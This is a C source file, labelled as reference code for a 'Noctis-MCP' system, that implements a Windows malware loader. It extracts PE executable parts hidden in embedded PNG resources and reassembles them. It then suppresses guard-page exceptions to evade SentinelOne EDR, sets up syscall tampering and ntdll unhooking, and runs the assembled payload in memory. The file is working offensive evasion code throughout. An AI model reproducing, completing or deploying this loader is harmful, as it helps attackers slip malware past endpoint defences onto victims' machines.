// Reference code for Noctis-MCP AI intelligence system

#include <Windows.h>
#include <intrin.h>
#include <shlobj.h>
#include <stdio.h>

#include "Structures.h"
#include "Utilities.h"
#include "TrapSyscallsTampering.h"
#include "StackSpoofing.h"
#include "UnpackAndHide.h"
#include "DebugMacros.h"
#include "Resource.h"
#include "Extract.h"
#include "Configuration.h"

#pragma comment (lib, "shell32.lib")


typedef struct _PAYLOAD_FILE
{
    ULONG_PTR   uRawAddress;
    SIZE_T      cbRawSize;

} PAYLOAD_FILE, * PPAYLOAD_FILE;


// Used For S1 EDR
LONG NTAPI SupressPageGuardException(IN EXCEPTION_POINTERS* Info) 
{
    // DBG_PRINT_A("[i] Caught Exception Of Code: 0x%0.8X [0x%p]", Info->ExceptionRecord->ExceptionCode, Info->ExceptionRecord->ExceptionAddress);

    if (Info->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) 
    {
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}


#ifdef UNHOOK_LOADED_DLLS
static HRESULT AddWin32uToIat() 
{
    WCHAR szPath[MAX_PATH] = { 0 };
    return SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}
#endif // UNHOOK_LOADED_DLLS


int main() 
{
	PAYLOAD_FILE    PeTotalPayloadFile  = { 0 };
	HMODULE 	    hModule             = GetModuleHandleH(NULL),
                    hNtdll              = GetNtdllBaseAddress();

    // 
    // StartCountingPrimes(10);

#ifdef UNHOOK_LOADED_DLLS
    AddWin32uToIat();
#endif // UNHOOK_LOADED_DLLS

    for (int i = 0; i < NUMBER_OF_PNGS; i++)
    {
        PAYLOAD_FILE     PngPayloadFile         = { 0 };
		PAYLOAD_FILE     PePartsPayloadFile     = { 0 };

        if (!GetResourceDataPayload(hModule, RT_RCDATA, (BASE_RESOURCE_ID + i + 1), (PVOID*)&PngPayloadFile.uRawAddress, &PngPayloadFile.cbRawSize))
        {
            DBG_PRINT_A("[!] GetResourceDataPayload Failed For Resource: %d", (BASE_RESOURCE_ID + i + 1));
			return -1;
		}

        DBG_PRINT_A("[i] Loaded PNG Size: %lu", PngPayloadFile.cbRawSize);
        DBG_PRINT_A("[i] Loaded PNG Address: 0x%p", (PVOID)PngPayloadFile.uRawAddress);

        if (!ExtractPeFromPngAligned((PBYTE)PngPayloadFile.uRawAddress, PngPayloadFile.cbRawSize, (PBYTE*)&PePartsPayloadFile.uRawAddress, &PePartsPayloadFile.cbRawSize))
        {
            DBG_PRINT_A("[!] ExtractPeFromPngAligned Failed For Part: %d", (i + 1));
			return -1;
        }

        DBG_PRINT_A("[i] Extracted PE Part %d Size: %lu", (i + 1), PePartsPayloadFile.cbRawSize);
        DBG_PRINT_A("[i] Extracted PE Part %d Address: 0x%p", (i + 1), (PVOID)PePartsPayloadFile.uRawAddress);

        if (!PeTotalPayloadFile.uRawAddress)
        {
            if (!(PeTotalPayloadFile.uRawAddress = LocalAlloc(LPTR, PePartsPayloadFile.cbRawSize)))
            {
                DBG_PRINT_A("[!] LocalAlloc Failed For Total Payload");
				return -1;
            }
        }
        else
        {
            if (!(PeTotalPayloadFile.uRawAddress = LocalReAlloc((HLOCAL)PeTotalPayloadFile.uRawAddress, PeTotalPayloadFile.cbRawSize + PePartsPayloadFile.cbRawSize, LMEM_MOVEABLE)))
            {
                DBG_PRINT_A("[!] LocalReAlloc Failed For Total Payload");
                return -1;
            }
        }

		RtlCopyMemory((PVOID)(PeTotalPayloadFile.uRawAddress + PeTotalPayloadFile.cbRawSize), (PVOID)PePartsPayloadFile.uRawAddress, PePartsPayloadFile.cbRawSize);
		PeTotalPayloadFile.cbRawSize += PePartsPayloadFile.cbRawSize;
		RtlSecureZeroMemory((PVOID)PePartsPayloadFile.uRawAddress, PePartsPayloadFile.cbRawSize);
		LocalFree((HLOCAL)PePartsPayloadFile.uRawAddress);
    }


	DBG_PRINT_A("[v] Ntdll Base Address: 0x%p", hNtdll);

    // Used For S1 EDR
    OverwriteFirstVectoredExceptionHandlerEx(hNtdll, SupressPageGuardException);

#ifdef TRAP_SYSCALLS_TAMPERING
    if (!InitializeTrapSyscallsVectoredHandler())
        return -1;
#else
    if (!InitNtdllConfigStructure(hNtdll))
        return -1;
#endif // TRAP_SYSCALLS_TAMPERING

#ifdef UNHOOK_LOADED_DLLS
    if (!InitNtdllConfigStructure(hNtdll))
        return -1;
#endif // UNHOOK_LOADED_DLLS


    ExecutePePayload(PeTotalPayloadFile.uRawAddress, PeTotalPayloadFile.cbRawSize);

    ExitThread(0);

	return 0;
}